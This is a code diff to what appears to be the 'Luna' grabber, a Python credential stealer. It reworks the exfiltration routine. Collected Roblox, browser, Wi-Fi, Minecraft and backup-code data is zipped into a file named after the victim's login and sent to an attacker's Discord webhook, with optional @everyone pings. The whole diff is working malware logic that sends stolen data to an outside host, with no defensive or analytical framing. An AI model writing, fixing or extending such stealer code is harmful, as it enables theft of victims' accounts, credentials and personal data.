@@ -45,6 +45,7 @@ __CONFIG__ = {
 
 #global variables
 tempfolder = mkdtemp()
+localappdata = os.getenv("localappdata")
 
 
 def main(webhook: str):
@@ -62,11 +63,6 @@ def main(webhook: str):
         except RuntimeError:
             continue
 
-    zipup()
-
-    _file = None
-    _file = File(f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip')
-
     content = ""
     if __CONFIG__["ping"]:
         if __CONFIG__["pingtype"] == "Everyone":
@@ -74,7 +70,13 @@ def main(webhook: str):
         elif __CONFIG__["pingtype"] == "Here":
             content += "@here"
 
-    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+    if not __CONFIG__["roblox"] and not __CONFIG__["browser"] and not __CONFIG__["wifi"] and not __CONFIG__["minecraft"] and not __CONFIG__["backupcodes"]:
+        webhook.send(content=content, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+    else:
+        zipup()
+        _file = None
+        _file = File(f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip')
+        webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
     if not __CONFIG__["systeminfo"]:
         pass
@@ -739,9 +741,6 @@ class BackupCodes:
 
 
 def zipup():
-    global localappdata
-    localappdata = os.getenv('LOCALAPPDATA')
-
     _zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
     zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
     abs_src = os.path.abspath(tempfolder)
